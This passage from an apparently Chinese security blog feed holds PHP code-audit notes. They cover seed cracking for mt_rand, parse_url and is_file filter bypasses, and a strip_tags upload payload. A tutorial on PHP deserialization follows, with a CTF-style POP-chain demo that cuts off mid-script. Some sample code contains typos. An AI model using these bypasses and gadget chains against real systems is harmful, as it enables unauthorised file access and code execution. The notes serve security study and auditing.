src="/../images/image-20220706210555229-1687432076955.png" alt="image-20220706210555229"></p><h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand(x):设定随机数种子为x</span><br><span class="line">mt_rand(a,b):生成[a,b]间的随机数</span><br></pre></td></tr></table></figure><p>随机数生成函数，实质上生成的是线性的伪随机数，简单来说就是y&#x3D;ax，x就是种子，a是范围，y就是生成的随机数。</p><p>所以只要种子固定了，每次生成的随机数都是相同的。</p><ol><li><p>已知在同一个种子下生成的多个随机数</p><p><a href="https://blog.csdn.net/weixin_34255793/article/details/92713300">https://blog.csdn.net/weixin_34255793/article/details/92713300</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用php_mt_seed对第一个随机数进行爆破，得到可能的种子（因为第一次调用mt_rand()函数的时候种子就确定下来了）</span><br><span class="line">然后用得到的种子来生成随机数，进行比对即可得到正确的种子</span><br></pre></td></tr></table></figure></li><li><p>已知第一个随机数</p><p><a href="https://blog.csdn.net/qq_52907838/article/details/119824220">https://blog.csdn.net/qq_52907838/article/details/119824220</a></p><p>php_mt_seed中给出的方法</p><p><img src="/../images/image-20220708120301114-1687432076956.png" alt="image-20220708120301114"></p><p>对应脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;Unclt9Kr75&quot;</span>;<span class="comment">//第一个随机数的前十位</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$length</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;<span class="comment">//完整的随机数</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$length</span>-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$a</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220708120520631-1687432076956.png" alt="image-20220708120520631"></p><p>关于php_mt_seed <a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p><h2 id="SERVER变量缺陷"><a href="#SERVER变量缺陷" class="headerlink" title="$_SERVER变量缺陷"></a>$_SERVER变量缺陷</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER[QUERY_STRING]  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220717130225205-1687432076956.png" alt="image-20220717130225205"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]：返回的是当前文件相对于根目录的路径host/$_SERVER[&quot;PHP_SELF&quot;]即url==host/$_SERVER[&quot;PHP_SELF&quot;]</span><br></pre></td></tr></table></figure><h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h2><p>使用方法</p><blockquote><p>用于解析url，获得url的组成部分</p></blockquote><p><img src="/../images/image-20220204213349476-1687432076956.png" alt="image-20220204213349476"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.zcool.com.cn/suning?p=69#tab_anchor&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$parts</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">http:<span class="comment">//www.zcool.com.cn/suning?p=69#tab_anchor&lt;/br&gt;array(5) &#123;</span></span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;www.zcool.com.cn&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;/suning&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;p=69&quot;</span></span><br><span class="line">  [<span class="string">&quot;fragment&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;tab_anchor&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞</p><blockquote><p>不应该将其作为检验url是否合法的手段</p></blockquote><ol><li><p>解析失败</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/test/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filter</span>=<span class="keyword">array</span>(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;qqqq&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$f</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;query&#x27;</span>]))</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack Detected&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807105935728-1687432076957.png" alt="image-20220807105935728"></p><blockquote><p>我们查询的字符串被拦截，没有输出a&#x3D;1</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1///test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807111314350-1687432076957.png" alt="image-20220807111314350"></p><blockquote><p>在正常路径前加上&#x2F;&#x2F;，parse_url就会解析失败，从而绕过过滤，成功输出a&#x3D;1</p></blockquote></li><li><p>端口解析错误</p><blockquote><p>php5.5以上</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;//pupiles.com/about:1234&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;port&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1234</span>)</span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>parse_url解析出了端口号，认为访问的是pupiles.com的1234端口下的about:1234文件，而实际上是访问pupiles.com下的about:1234文件</p></blockquote></li><li><p>路径解析错误</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;/upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// doubleslash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;//upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [path] =&gt; /upload</span><br><span class="line">)</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [host] =&gt; upload</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>可以看到parse_url解析时，&#x2F;xxx解析为路径，&#x2F;&#x2F;xxx解析为主机</p></blockquote></li></ol><h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a>is_file</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>伪协议  is_file检测除了file外的伪协议都是false    </li><li>假目录   <code>./xxx/../f14g.php </code></li></ul><h2 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]  = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="number">1</span>.&lt;&gt;php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>序列化是将对象转化为数据字节流，反序列化是将数据字节流转换成对象。</p><p>例如java采用二进制序列，PHP采用可见字符串序列。</p><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h2 id="非类序列化"><a href="#非类序列化" class="headerlink" title="非类序列化"></a>非类序列化</h2><p>相比于类序列化少了对象名长度和对象名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span></span><br><span class="line">&gt;&gt;a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="类序列化"><a href="#类序列化" class="headerlink" title="类序列化"></a>类序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    pubilc <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        this-&gt;name = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220620212404834.png" alt="image-20220620212404834"></p><blockquote><p>可以发现序列化时只会序列化类的属性，而不会序列化类的方法。</p></blockquote><h3 id="类属性权限对序列化的影响"><a href="#类属性权限对序列化的影响" class="headerlink" title="类属性权限对序列化的影响"></a>类属性权限对序列化的影响</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;i:<span class="number">19</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;infoc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果仔细观察会发现protected和private变量序列化后变量名长度发生了变化</p><ul><li><p>s:4:”*b”;</p></li><li><p>s:7:”infoc”</p><p>我们用010打开1.txt</p><p><img src="/../images/image-20220714122008106.png" alt="image-20220714122008106"></p></li></ul><p>​可以发现protected序列化后，会在变量名前加上%00*%00</p><p>​而private序列化后，会在变量名前加上%00类名%00</p><blockquote><p>在实际运用中可以用\00（<code>空</code>）用%00代替</p><p>原因：php的<code>urlencode()</code>会自动把<code>空</code>编码成%00</p></blockquote><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: 魔术方法 - Manual</a></p><h3 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类的构造函数，创建类对象时调用</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的析构函数，对象销毁时调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行serialize()时，会先调用这个函数，再调用construct函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行unserialize()时，会先调用这个函数，再调用destruct函数</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当调用的方法不存在时触发</span></span><br><span class="line"><span class="comment">$name: 被调用方法的名字</span></span><br><span class="line"><span class="comment">$arguments：传递给被调用方法的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">类被当成字符串时</span></span><br><span class="line"><span class="comment">1.输出对象：echo/print等 </span></span><br><span class="line"><span class="comment">2.函数的参数类型为字符串，将对象作为参数时</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br></pre></td></tr></table></figure><ul><li><p>__invoke()</p><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;触发了ivoke魔术方法&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#实例化对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">#以调用函数的方式调用一个对象</span></span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;触发了ivoke魔术方法</span><br></pre></td></tr></table></figure></li><li><p>不可访问（protected 或 private）或不存在的属性</p><p>赋值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 会被调用。</p><p>读取时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</p><p>调用 <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或 <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 会被调用。</p><p>调用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> 会被调用。</p></li><li><p>其他</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure></li></ul><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>有序列化就有反序列化，漏洞点就产生于反序列化时。</p><p>因为序列化数据中存储的是类对象的属性，如果未对用户输入的序列化字符串进行检测，攻击者就可以构造恶意序列化数据，控制反序列化过程，从而<strong>覆盖变量</strong>，进而导致代码执行，SQL 注入，目录遍历等不可控后果。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol><li><p>定位序列化和反序列化代码，找到可控参数和反序列化对象</p></li><li><p>明确要利用的方法和属性</p></li><li><p>根据其所在类的魔术方法构造pop链（传入参数到触发关键函数,注意类属性的类型）</p><p>在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p></li><li><p>传递构造好的序列化内容(最好要urlencode一下)，触发反序列化，完成攻击</p></li></ol><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;<span class="comment">//flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里目的是要触发 __get() 这个函数，魔术方法__get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现 __toStrong() 方法，而又存在 <code>echo $a</code> 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 <code>return $this-&gt;str-&gt;flag</code>时就会跳转到 get 对象的 魔术方法 __get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。之后要 include <code>&#39;flag.php&#39;</code>，由于$name &#x3D;&#x3D; flag，所以要构造 $flag &#x3D;&#x3D; ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。</p><p>即</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">example</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">get</span>(<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span 